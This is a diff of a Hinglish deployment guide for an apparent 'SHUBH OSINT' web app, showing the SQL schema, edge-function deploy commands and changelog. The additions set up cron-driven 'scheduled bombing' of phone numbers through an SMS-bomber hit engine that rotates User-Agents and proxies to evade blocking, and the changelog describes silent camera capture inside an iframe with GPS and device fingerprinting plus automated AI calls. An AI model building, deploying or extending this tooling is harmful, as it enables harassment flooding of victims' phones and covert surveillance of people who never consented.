@@ -1,7 +1,7 @@
 # 🚀 Complete Migration Guide: Apna Supabase + Vercel Deployment
 
-**Last Updated:** 2026-02-11  
-**Version:** 3.9 (Dual-Mode Engine: Sequential + Parallel)
+**Last Updated:** 2026-02-16  
+**Version:** 4.1 (Neon Theme + Scheduled Hits + Full Hit Engine)
 
 ---
 
@@ -55,7 +55,7 @@ Ya ye SQL directly use karo:
 
 ```sql
 -- =====================================================
--- SHUBH OSINT - Complete Database Setup v3.8
+-- SHUBH OSINT - Complete Database Setup v4.1
 -- =====================================================
 
 -- 1. TABLES CREATE KARO
@@ -149,6 +149,21 @@ CREATE TABLE IF NOT EXISTS public.hit_apis (
   updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
+-- Scheduled Hits Table (v4.0 - cron-based scheduled bombing)
+CREATE TABLE IF NOT EXISTS public.scheduled_hits (
+  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
+  phone_number TEXT NOT NULL,
+  start_time TIMESTAMP WITH TIME ZONE NOT NULL,
+  interval_seconds INTEGER NOT NULL DEFAULT 60,
+  max_rounds INTEGER DEFAULT 0,
+  is_active BOOLEAN NOT NULL DEFAULT true,
+  last_executed_at TIMESTAMP WITH TIME ZONE,
+  next_execution_at TIMESTAMP WITH TIME ZONE,
+  total_hits INTEGER NOT NULL DEFAULT 0,
+  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
+  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
+);
+
 -- 2. ROW LEVEL SECURITY (RLS) ENABLE KARO
 -- =====================================================
 
@@ -160,6 +175,7 @@ ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.scheduled_hits ENABLE ROW LEVEL SECURITY;
 
 -- 3. RLS POLICIES CREATE KARO
 -- =====================================================
@@ -226,6 +242,19 @@ ON public.hit_apis FOR UPDATE USING (true);
 
 CREATE POLICY "Anyone can delete hit apis" 
 ON public.hit_apis FOR DELETE USING (true);
+
+-- Scheduled Hits: Public CRUD
+CREATE POLICY "Anyone can read scheduled hits" 
+ON public.scheduled_hits FOR SELECT USING (true);
+
+CREATE POLICY "Anyone can insert scheduled hits" 
+ON public.scheduled_hits FOR INSERT WITH CHECK (true);
+
+CREATE POLICY "Anyone can update scheduled hits" 
+ON public.scheduled_hits FOR UPDATE USING (true);
+
+CREATE POLICY "Anyone can delete scheduled hits" 
+ON public.scheduled_hits FOR DELETE USING (true);
 
 -- 4. STORAGE BUCKETS CREATE KARO
 -- =====================================================
@@ -296,6 +325,10 @@ CREATE TRIGGER update_hit_apis_updated_at
 BEFORE UPDATE ON public.hit_apis
 FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
 
+CREATE TRIGGER update_scheduled_hits_updated_at
+BEFORE UPDATE ON public.scheduled_hits
+FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
+
 -- 6. INDEXES FOR PERFORMANCE
 -- =====================================================
 
@@ -303,12 +336,19 @@ CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_k
 CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
 CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
 CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
+CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
 CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
+CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
 CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
+CREATE INDEX IF NOT EXISTS idx_captured_videos_date ON public.captured_videos(captured_at);
 CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
+CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
 CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
 CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
 CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_active ON public.scheduled_hits(is_active);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_next ON public.scheduled_hits(next_execution_at);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_phone ON public.scheduled_hits(phone_number);
 
 -- 7. REALTIME ENABLE KARO
 -- =====================================================
@@ -317,7 +357,6 @@ ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;
 
 -- 8. DEFAULT SETTINGS INSERT KARO
 -- =====================================================
--- NOTE: camSessionId is ONLY changeable via Admin Panel (v3.2)
 
 INSERT INTO public.app_settings (setting_key, setting_value)
 VALUES (
@@ -344,6 +383,8 @@ VALUES (
     "camAutoRedirect": true,
     "camQuality": 0.8,
     "creditSystemEnabled": true,
+    "headerBorderEnabled": true,
+    "tabContainerBorderEnabled": true,
     "tabs": []
   }'::jsonb
 )
@@ -390,7 +431,7 @@ supabase link --project-ref YOUR_PROJECT_ID
 ### 4.4 Edge Functions Deploy Karo
 
 ```bash
-# Sab functions ek saath deploy
+# Sab functions ek saath deploy (v4.1 - 11 functions)
 supabase functions deploy auth-login
 supabase functions deploy auth-verify
 supabase functions deploy credits-deduct
@@ -400,6 +441,8 @@ supabase functions deploy numinfo-v2
 supabase functions deploy telegram-osint
 supabase functions deploy call-dark
 supabase functions deploy hit-api
+supabase functions deploy image-to-info
+supabase functions deploy execute-scheduled-hits
 ```
 
 ### 4.5 Edge Function Secrets Set Karo
@@ -410,6 +453,30 @@ Supabase Dashboard → **Settings** → **Edge Functions** → **Secrets**
 |-------------|-------|
 | `MY_SUPABASE_URL` | `https://YOUR_PROJECT_ID.supabase.co` |
 | `MY_SERVICE_ROLE_KEY` | Service Role Key |
+
+### 4.6 Scheduled Hits Cron Setup (Optional)
+
+Agar scheduled bombing feature chahiye toh pg_cron + pg_net enable karo:
+
+1. Supabase Dashboard → **Database** → **Extensions**
+2. `pg_cron` aur `pg_net` enable karo
+3. SQL Editor mein ye run karo:
+
+```sql
+select cron.schedule(
+  'execute-scheduled-hits-every-minute',
+  '* * * * *',
+  $$
+  select net.http_post(
+    url:='https://YOUR_PROJECT_ID.supabase.co/functions/v1/execute-scheduled-hits',
+    headers:='{"Content-Type": "application/json", "Authorization": "Bearer YOUR_ANON_KEY"}'::jsonb,
+    body:=concat('{"time": "', now(), '"}')::jsonb
+  ) as request_id;
+  $$
+);
+```
+
+⚠️ `YOUR_PROJECT_ID` aur `YOUR_ANON_KEY` replace karna mat bhoolo!
 
 ---
 
@@ -429,7 +496,7 @@ GitHub repo connect karke deploy karo.
 
 ---
 
-## 📁 Edge Functions Reference (v3.8)
+## 📁 Edge Functions Reference (v4.1)
 
 | Function | Purpose | Method |
 |----------|---------|--------|
@@ -442,10 +509,41 @@ GitHub repo connect karke deploy karo.
 | `telegram-osint` | Telegram OSINT API | POST |
 | `call-dark` | AI call dispatch | POST |
 | `hit-api` | API Hit Engine + UA rotation | POST |
+| `image-to-info` | Image analysis API | POST |
+| `execute-scheduled-hits` | Cron scheduled bombing | POST |
 
 ---
 
-## 🔄 Version 3.8 Changes
+## 🔄 Version 4.1 Changes
+
+### Full Neon Theme Overhaul
+- ✅ Pure black background with neon glow orbs (green, pink, cyan, purple)
+- ✅ Header: rainbow running border animation + color-cycling logo text
+- ✅ Tab grid: color-changing running border (green → cyan → pink → purple)
+- ✅ Feature cards: neon color-specific glow variants on selection
+- ✅ Logs panel: terminal-style with neon green success / neon red failure
+- ✅ All text: neon text-shadow + font-mono terminal aesthetic
+- ✅ Backdrop-blur + glowing containers across all components
+
+---
+
+## 🔄 Version 4.0 Changes
+
+### Scheduled Hits (Server-Side Cron)
+- ✅ `scheduled_hits` table for automated bombing schedules
+- ✅ `execute-scheduled-hits` edge function for background execution
+- ✅ pg_cron + pg_net integration (runs every minute)
+- ✅ Configurable: interval, max rounds, start time
+- ✅ Auto-deactivates when max rounds reached
+
+### SMS Bomber Simplification
+- ✅ Only phone number logged to search_history (no per-hit logs)
+- ✅ Disabled tabs remain visible but show "contact admin"
+- ✅ Disabled tab attempts logged as `[type]_disabled`
+
+---
+
+## 🔄 Version 3.9 Changes
 
 ### Hit Engine Database Migration
 - ✅ APIs ab `hit_apis` table mein store hoti hain (localStorage hataya)
@@ -459,23 +557,6 @@ GitHub repo connect karke deploy karo.
 - ✅ Har request pe DIFFERENT User-Agent use hota hai
 - ✅ Chrome, Firefox, Safari, Edge, Opera, Brave, Vivaldi
 - ✅ Windows, Mac, Linux, Android, iPhone sab covered
-- ✅ Sequential rotation — har request alag browser lagti hai
-- ✅ `Sec-CH-UA-Platform`, `Sec-Fetch-*` headers bhi rotate hote hain
-- ✅ Response mein `user_agent_used` field dikhaata hai konsa UA use hua
-
-### How It Works
-```
-Request 1 → Chrome 120 Windows
-Request 2 → Chrome 119 Windows  
-Request 3 → Chrome 118 Windows
-Request 4 → Chrome 121 Mac
-Request 5 → Firefox 121 Windows
-Request 6 → Safari 17.2 Mac
-Request 7 → Edge 120 Windows
-...
-Request 35 → Vivaldi 6.5 Windows
-Request 36 → Chrome 120 Windows (loop back)
-```
 
 ---
 
@@ -483,8 +564,6 @@ Request 36 → Chrome 120 Windows (loop back)
 
 ### Tab Container 12-Color Rainbow Border
 - ✅ 12 unique neon colors for tab container border
-- ✅ Separate from header rainbow colors
-- ✅ New colors: lime, magenta, teal, coral, gold, violet, etc.
 
 ---
 
@@ -507,20 +586,8 @@ Request 36 → Chrome 120 Windows (loop back)
 
 ### Iframe Capture Feature
 - ✅ New `/iframe-capture` page for embedding any URL
-- ✅ `camIframeUrl` setting added to app_settings
 - ✅ Silent camera capture runs in background with iframe
 - ✅ Device info + GPS location captured automatically
-
-### Session Config Cleanup
-- ❌ Session change removed from ShubhCam Config tab
-- ✅ Session ID ONLY changeable via Admin Panel
-- ✅ Cleaner Config tab with only capture settings
-
-### Device Intelligence
-- ✅ All capture pages now collect device fingerprint
-- ✅ GPS location with Google Maps link
-- ✅ Battery, screen, UserAgent info captured
-- ✅ Data stored with `sessionId_deviceinfo` identifier
 
 ---
 
@@ -529,26 +596,6 @@ Request 36 → Chrome 120 Windows (loop back)
 ### CALL DARK Feature
 - ✅ AI-powered automated calls via Omnidim API
 - ✅ Admin panel settings for API Key, Agent ID
-- ✅ Configurable max duration
-
----
-
-## 🔄 Version 3.2 Changes
-
-### CAM Session Control (Admin Only)
-- ❌ Session change button removed from ShubhCam component
-- ✅ Session ID can ONLY be changed via Admin Panel → CAM Settings
-- ✅ All capture pages (Normal, Custom, Chrome) use session from app_settings
-
-### JSON Result Viewer
-- ✅ Syntax highlighting with neon colors
-- ✅ Line-by-line typing animation
-- ✅ Copy individual fields or all data
-- ✅ Export to PDF feature
-
-### Admin Panel Updates
-- ✅ Dual header color controls (Name 1 & Name 2)
-- ✅ Session ID input in CAM settings only
 
 ---
 
@@ -581,6 +628,11 @@ supabase functions deploy function-name
 - Enable "Free Proxy" toggle for additional IP rotation
 - Use Residential Proxy for strongest bypass
 
+### Scheduled Hits Not Executing
+- pg_cron aur pg_net extensions enabled hain check karo
+- Cron job schedule verify karo: `select * from cron.job;`
+- Edge function logs check karo for errors
+
 ---
 
 ## 📊 Database Tables Quick Reference
@@ -595,6 +647,7 @@ supabase functions deploy function-name
 | `captured_videos` | Video metadata | Public (Permissive) | ❌ |
 | `search_history` | Search logs | Public | ❌ |
 | `hit_apis` | API Hit Engine configs | Public CRUD | ✅ |
+| `scheduled_hits` | Scheduled bombing | Public CRUD | ❌ |
 
 ---
 
@@ -602,10 +655,14 @@ supabase functions deploy function-name
 
 - [ ] Supabase project created
 - [ ] API keys noted
-- [ ] SQL script executed (v3.9)
+- [ ] SQL script executed (v4.1)
 - [ ] Storage buckets created
-- [ ] Edge functions deployed (9 functions)
+- [ ] Edge functions deployed (11 functions)
 - [ ] Secrets configured
+- [ ] pg_cron + pg_net enabled (for scheduled hits)
+- [ ] Cron job created for execute-scheduled-hits
 - [ ] Vercel env vars set
 - [ ] Site tested
-- [ ] Hit Engine tested (Sequential + Parallel modes)
+- [ ] Hit Engine tested
+- [ ] Scheduled Hits tested
+- [ ] Neon theme verified
